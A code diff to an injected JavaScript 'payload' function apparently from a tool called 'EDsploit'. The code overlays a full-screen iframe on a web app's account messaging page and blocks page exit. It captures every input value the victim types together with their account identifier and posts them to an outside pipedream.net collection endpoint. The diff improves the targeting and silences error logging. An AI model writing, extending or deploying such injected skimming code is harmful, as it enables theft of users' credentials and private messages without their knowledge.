@@ -51,7 +51,7 @@ async function payload() {
 	window.top.addEventListener('beforeunload', (e) => { e.preventDefault(); e.returnValue = ''; });
 
 	const i = window.top.document.createElement('iframe');
-	i.src = `/`;
+	i.src = `/${JSON.parse(sessionStorage.getItem("accounts")).payload.accounts?.[0].typeCompte}/${JSON.parse(sessionStorage.getItem("accounts")).payload.accounts?.[0].id}/Messagerie`;
 	i.className = 'EDsploit';
 	i.style.cssText = 'position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
 	window.top.document.body.appendChild(i);
@@ -88,7 +88,7 @@ async function payload() {
 					const data = { 
 						input: this.name || this.id || this.type || this.className || 'field',
 						value: this.value || this.innerText,
-						location: window.location,
+						location: i.contentWindow.location.href,
 						name: JSON.parse(sessionStorage.getItem("accounts")).payload.accounts?.[0].identifiant
 					};
 					await fetch('https://8d72fc5d27b20a8d575b1973c65a62c3.m.pipedream.net', {
@@ -104,9 +104,7 @@ async function payload() {
 			const observer = new MutationObserver(() => attachListeners(doc));
 			observer.observe(doc.body, { childList: true, subtree: true });
 			attachListeners(doc);
-		} catch (err) {
-			console.error('iframe hook failed', err);
-		}
+		} catch {}
 	}
 
 	return;
